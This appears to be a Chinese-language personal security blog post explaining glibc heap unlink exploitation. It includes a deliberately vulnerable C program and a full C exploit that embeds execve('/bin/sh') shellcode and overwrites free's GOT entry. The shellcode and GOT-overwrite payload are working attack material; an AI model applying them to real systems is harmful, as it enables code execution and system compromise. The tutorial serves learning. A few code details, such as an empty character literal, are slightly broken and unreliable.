<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/ESE.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/ESE1.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="ESE's Note" type="application/atom+xml" />






<meta name="description" content="学习栈一段时间了，现在转战学习堆">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN之unlink">
<meta property="og:url" content="http://yoursite.com/2017/11/23/pwn_heap_1/index.html">
<meta property="og:site_name" content="ESE&#39;s Note">
<meta property="og:description" content="学习栈一段时间了，现在转战学习堆">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.imgur.com/ckaHajP.png">
<meta property="og:image" content="https://i.imgur.com/eQWfSFe.png">
<meta property="og:updated_time" content="2017-12-30T09:14:19.570Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PWN之unlink">
<meta name="twitter:description" content="学习栈一段时间了，现在转战学习堆">
<meta name="twitter:image" content="https://i.imgur.com/ckaHajP.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2017/11/23/pwn_heap_1/"/>





  <title>PWN之unlink | ESE's Note</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ESE's Note</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">阅览室</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/23/pwn_heap_1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ESE's Note">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">PWN之unlink</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-23T10:40:36+08:00">
                2017-11-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          
          作者：ESE

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>学习栈一段时间了，现在转战学习堆<br><a id="more"></a></p>
<h1 id="1、unlink原理"><a href="#1、unlink原理" class="headerlink" title="1、unlink原理"></a>1、unlink原理</h1><p>Heap Overflow的原理是修改程序中的GOT（Global Offest Table）表来使得程序调用正规函数时(如printf() free()等)跳入我们设计的shellcode。在这一点上它的手段类似于Format String Attack都是利用修改内存来达到攻击的目的。Heap Overflow的优点是一次运行基本搞定，不像stack overflow还可能需要猜多次栈的偏移，</p>
<p>如何能够任意修改内存呢？Heap Overflow攻击利用了内存释放函数free的一个特性。利用了我们当调用free释放一个内存空间时，free函数内存将会查看在堆中下一个或者上一个内存是否也已经释放。如果是的话，那么程序将执行一个Unlink宏将两个内存空间结合起来，这样的话能够减少堆中的内存碎片从而提高程序的效率。</p>
<p>Unlink宏的执行方式类似于双向链表中删除其中某一个元素的操作。也就是将前一个元素的后指针指向当前的后指针，后一个元素的前指针指向当前的前指针。我们要注意到，这其实是两个内存赋值操作，本质上就是两个类似于*ptr = data的操作。而如果我们设计的字符串够长到足以能够修改到以上ptr和data的值的话，我们其实就能够修改程序内任意内存地址的值，包括以上提到的GOT表，从而改变让程序跳入我们设计的shellcode。</p>
<h1 id="2、堆之unlink"><a href="#2、堆之unlink" class="headerlink" title="2、堆之unlink"></a>2、堆之unlink</h1><p>我们先看看一个有堆溢出的程序<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[] )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">char</span> * first, * second;</div><div class="line"></div><div class="line"><span class="comment">/*[1]*/</span> first = <span class="built_in">malloc</span>( <span class="number">666</span> );</div><div class="line"><span class="comment">/*[2]*/</span> second = <span class="built_in">malloc</span>( <span class="number">12</span> );</div><div class="line">        <span class="keyword">if</span>(argc!=<span class="number">1</span>)</div><div class="line"><span class="comment">/*[3]*/</span>         <span class="built_in">strcpy</span>( first, argv[<span class="number">1</span>] );</div><div class="line"><span class="comment">/*[4]*/</span> <span class="built_in">free</span>( first );</div><div class="line"><span class="comment">/*[5]*/</span> <span class="built_in">free</span>( second );</div><div class="line"><span class="comment">/*[6]*/</span> <span class="keyword">return</span>( <span class="number">0</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里当使用申请mallloc申请内存空间的时候，如果申请成功，将会创建一个chunk并返回chunk地址指针，失败则返回<code>NULL</code>。上面程序的的申请堆的情况如下(chunk1_size=0x2a1[下面会说怎么计算]):<br><img src="https://i.imgur.com/ckaHajP.png" alt=""><br>chunk头包括以下两部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">prev_size: 如果当前chunk的相邻前一chunk未被使用，prev_size为此前一chunk的大小</div><div class="line">size: 当前chunk的大小。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息。我们需要记住的便是最低bit，倒数第一位即图中P的位置，用于指示前一chunk是否已被使用(PREV_INUSE[0（偶数）是没有被使用])，倒数第二位表示chunk是否由mmap分配</div><div class="line">倒数第三位表示是否储存在main arena。</div></pre></td></tr></table></figure></p>
<p>如果当前chunk处于未被使用状态，则mem前8 bytes被用来存储其他信息，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fd: 下一个未被使用的chunk的地址</div><div class="line">bk: 上一个未被使用的chunk的地址</div></pre></td></tr></table></figure></p>
<p>当调用malloc后，程序做的第一件事就是在bins中找是否有符合大小的被释放块，如果有，这个被释放块就会从链表中脱离（unlink），如果没有就在top chunk中紧接着上次分配的chunk后面再分配一个chunk。<br>unlink的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/* Take a chunk off a bin list */</div><div class="line">#define unlink(P, BK, FD) &#123;                                            </div><div class="line">  FD = P-&gt;fd;                                                          </div><div class="line">  BK = P-&gt;bk;                                                          </div><div class="line">  FD-&gt;bk = BK;                                                         </div><div class="line">  BK-&gt;fd = FD;                                                         </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>很早之前就有人总结出了unlink的利用技巧，将unlink代码写得直白一点就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FD = *P + 8;</div><div class="line">BK = *P + 12;</div><div class="line">FD + 12 = BK;</div><div class="line">BK + 8 = FD;</div></pre></td></tr></table></figure></p>
<p>上面第四行存在堆溢出，当argv[1]大于666字节的时候，就会堆溢出到第二个chunk的地址</p>
<p>unlink：这个技巧的核心思想，就是欺骗 glibc malloc 来 unlink 第二个块。unlink free的 GOT 条目会使其被 shellcode 地址覆盖。在成功覆盖之后，现在在行[5]，free被漏洞程序调用时，shellcode 就会执行。不是很清楚嘛？没问题，首先让我们看看执行free时，glibc malloc 在干什么。</p>
<h2 id="如果没有攻击者影响，行-4-的free会做这些事情："><a href="#如果没有攻击者影响，行-4-的free会做这些事情：" class="headerlink" title="如果没有攻击者影响，行[4]的free会做这些事情："></a>如果没有攻击者影响，行[4]的free会做这些事情：</h2><p>对于不是 mmap 的块，会向前或向后合并。<br>向后合并<br>    查看前一个块是不是空闲的 – 前一个块是空闲的，如果当前空闲块的PREV_INUSE(P)位没有设置。但是我们这里，前一个块是分配的，因为它的PREV_INUSE位设置了，通常堆内存的第一个块的前面那个块是分配的（即使它不存在）。<br>    如果空闲，合并它。例如，从 binlist unlink（移除）前一个块，将前一个块的大小与当前块相加，并将块指针指向前一个快。但是我们这里，前一个快是分配的，因此 unlink 不会调用。当前空闲块first不能向后合并。<br>向前合并<br>   查看下一个块是不是空闲的 – 下一个块是空闲的，如果下下个块（距离当前空闲块）的PREV_INUSE(P)位没有设置。为了访问下下个块，将当前块的大小加到它的块指针，再将下一个块的大小加到下一个块指针。我们这里，距离当前空闲块的下下个块是 top 块，它的PREV_INUSE位已设置。因此下一个块second不是空闲的。<br>   如果是空闲的，合并它。例如，从它的 binlist 中 unlink（移除）下一个块，并将下一个块的大小添加到当前大小。但是我们这里，下一个块是分配的，因此 unlink 不会调用。当前空闲块first不能向前合并。<br>   现在将合并后的块添加到 unsorted bin 中。我们这里，由于合并没有发生，只将first块添加到票 unsorted bin 中。<br>现在让我们假设，攻击者在行[3]覆盖了second块的块头部，像这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">prev_size=0  即表示前一个chunk为free</div><div class="line">size = -4</div><div class="line">fb=free_addr-12</div><div class="line">bk=Shellcode_addr</div></pre></td></tr></table></figure></p>
<p>free_addr-12是free的got目录的地址</p>
<h2 id="在攻击者的影响下，行-4-的free会做下面的事情："><a href="#在攻击者的影响下，行-4-的free会做下面的事情：" class="headerlink" title="在攻击者的影响下，行[4]的free会做下面的事情："></a>在攻击者的影响下，行[4]的free会做下面的事情：</h2><p>对于不是 mmap 的块，会向前或向后合并。<br>向后合并<br>    鉴于first的前一个chunk非free的，所以不会发生向后合并操作。<br>向前合并<br>    从上面代码可以知道，它是通过将nextchunk + nextsize计算得到指向下下一个chunk的指针，然后判断下下个chunk的size的PREV_INUSE标记位。在本例中，此时nextsize被我们设置为了-4，这样glibc malloc就会将next chunk的prev_size字段看做是next-next chunk的size字段，而我们已经将next chunk的prev_size字段设置为了一个偶数，因此此时通过inuse_bit_at_offset宏获取到的nextinuse为0，即next chunk为free！既然next chunk为free，那么就需要进行向前合并，所以就会调用unlink(nextchunk, bck, fwd);函数。真正的重点就是这个unlink函数！<br>现在将合并后的块添加到 unsorted bin 中。<br>看看漏洞程序的堆内存的图片，在攻击者影响用户输入之后：<br><img src="https://i.imgur.com/eQWfSFe.png" alt=""></p>
<h1 id="3、利用unlink"><a href="#3、利用unlink" class="headerlink" title="3、利用unlink"></a>3、利用unlink</h1><p>要完成Heap Overflow，有几点需要注意：</p>
<ol>
<li>计算堆的大小<br>堆得大小和分配的大小不一样，我们要多分配4byte来保存这个堆的大小，而堆的大小又必须是8的倍数，所以堆得实际大小的计算方法是：<br>actual_size = （floor((memory_size + 4)/8) * 8）| 0x1, 其中floor()是上取整操作。</li>
<li>修改使得第二个内存”看起来”已经被释放过<br>这可以通过首先设置第二个内存大小为-4，然后再将内存上一个byte的值设置为一个偶数来完成</li>
<li>修改GOT表<br>这实际上相当于一个一个内存赋值问题<br>*(GOT_Table_Addr + 12) = shellcode_address<br>GOT表中某函数的位置可以通过objdump -R来查看</li>
<li>准备邪恶的shellcode<br>由于我们准备将shellcode放在堆中，而且用空指令NOP来铺路，shellcode的地址其实就可以是堆起始地址后偏移任意位（貌似大于8bytes就可以）。这里我们可以用ltrace命令来查看某内存在堆中的地址。<h1 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp"></a>4、exp</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Program to exploit 'vuln' using unlink technique.</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNCTION_POINTER ( 0x0804978c )         <span class="comment">//Address of GOT entry for free function obtained using "objdump -R vuln".</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_ADDRESS ( 0x0804a008 + 0x10 )      <span class="comment">//Address of variable 'first' in vuln executable. </span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> VULNERABLE <span class="meta-string">"./vuln"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> DUMMY 0xdefaced</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></div><div class="line"></div><div class="line"><span class="keyword">char</span> shellcode[] =</div><div class="line">        <span class="comment">/* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function</span></div><div class="line"><span class="comment">        (by statement BK-&gt;fd = FD). Hence if no jump exists shell code would get corrupted by unlink function. </span></div><div class="line"><span class="comment">        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/</span></div><div class="line">        <span class="string">"\xeb\x0assppppffff"</span></div><div class="line">        <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">void</span> )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">char</span> * p;</div><div class="line">        <span class="keyword">char</span> argv1[ <span class="number">680</span> + <span class="number">1</span> ];</div><div class="line">        <span class="keyword">char</span> * argv[] = &#123; VULNERABLE, argv1, <span class="literal">NULL</span> &#125;;</div><div class="line"></div><div class="line">        p = argv1;</div><div class="line">        <span class="comment">/* the fd field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the fd_nextsize field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk_nextsize field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* Copy the shellcode */</span></div><div class="line">        <span class="built_in">memcpy</span>( p, shellcode, <span class="built_in">strlen</span>(shellcode) );</div><div class="line">        p += <span class="built_in">strlen</span>( shellcode );</div><div class="line">        <span class="comment">/* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize </span></div><div class="line"><span class="comment">        of first chunk */</span></div><div class="line">        <span class="built_in">memset</span>( p, <span class="string">'B'</span>, (<span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span>) - (<span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode)) );</div><div class="line">        p += ( <span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span> ) - ( <span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode) );</div><div class="line">        <span class="comment">/* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */</span></div><div class="line">        *( (<span class="keyword">size_t</span> *)p ) = (<span class="keyword">size_t</span>)( DUMMY &amp; ~PREV_INUSE );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/</span></div><div class="line">        *( (<span class="keyword">size_t</span> *)p ) = (<span class="keyword">size_t</span>)( <span class="number">-4</span> );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function</span></div><div class="line"><span class="comment">        would do + 12 (FD-&gt;bk). This helps to overwrite the GOT entry of free with the address we have overwritten in </span></div><div class="line"><span class="comment">        second chunk's bk field (see below) */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( FUNCTION_POINTER - <span class="number">12</span> );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk field of the second chunk. It should point to shell code address.*/</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( CODE_ADDRESS );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the terminating NUL character */</span></div><div class="line">        *p = '';</div><div class="line"></div><div class="line">        <span class="comment">/* the execution of the vulnerable program */</span></div><div class="line">        execve( argv[<span class="number">0</span>], argv, <span class="literal">NULL</span> );</div><div class="line">        <span class="keyword">return</span>( <span class="number">-1</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>参考链接：<br><a href="http://cb.drops.wiki/drops/tips-16610.html" target="_blank" rel="external">http://cb.drops.wiki/drops/tips-16610.html</a><br><a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a><br><a href="https://etenal.me/archives/1121" target="_blank" rel="external">https://etenal.me/archives/1121</a></p>

      
    </div>
    
    
    

    <div>
      
        
      
    </div>
    

    

    

    <div>
     
      <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>
      
    </div>

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/11/19/pwn_baby/" rel="next" title="PWN_x86_培训">
                <i class="fa fa-chevron-left"></i> PWN_x86_培训
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/12/04/2017_12_24_miac_xianxia/" rel="prev" title="第四届MIAC线下总结">
                第四届MIAC线下总结 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.png"
                alt="" />
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">48</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/saucxs/" target="_blank" title="GitHub">
                    
                      <i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://weibo.com/" target="_blank" title="Twitter">
                    
                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://www.zhihu.com/people/ese-76-83/activities" target="_blank" title="Zhihu">
                    
                      <i class="fa fa-fw fa-drupal"></i>Zhihu</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://weibo.com/5899672336/profile?topnav=1&wvr=6/&is_all=1" target="_blank" title="Weibo">
                    
                      <i class="fa fa-fw fa-weibo"></i>Weibo</a>
                </span>
              
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-globe"></i>
                
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.betamao.me/" title="betamao" target="_blank">betamao</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://err0rzz.github.io/" title="err0rzz" target="_blank">err0rzz</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://veritas501.space/" title="Veritas501" target="_blank">Veritas501</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://lalajun.github.io/" title="lalajun" target="_blank">lalajun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://bestwing.me/" title="swing" target="_blank">swing</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://b3t4m3ee.github.io/" title="b3t4m3ee" target="_blank">b3t4m3ee</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://myblackmanba.github.io/" title="black" target="_blank">black</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.baidu.com" title="百度一下" target="_blank">百度一下</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1、unlink原理"><span class="nav-number">1.</span> <span class="nav-text">1、unlink原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2、堆之unlink"><span class="nav-number">2.</span> <span class="nav-text">2、堆之unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#如果没有攻击者影响，行-4-的free会做这些事情："><span class="nav-number">2.1.</span> <span class="nav-text">如果没有攻击者影响，行[4]的free会做这些事情：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#在攻击者的影响下，行-4-的free会做下面的事情："><span class="nav-number">2.2.</span> <span class="nav-text">在攻击者的影响下，行[4]的free会做下面的事情：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3、利用unlink"><span class="nav-number">3.</span> <span class="nav-text">3、利用unlink</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4、exp"><span class="nav-number">4.</span> <span class="nav-text">4、exp</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>

  
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>

<span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>



<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共43.6k字</span>
</div>

        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  


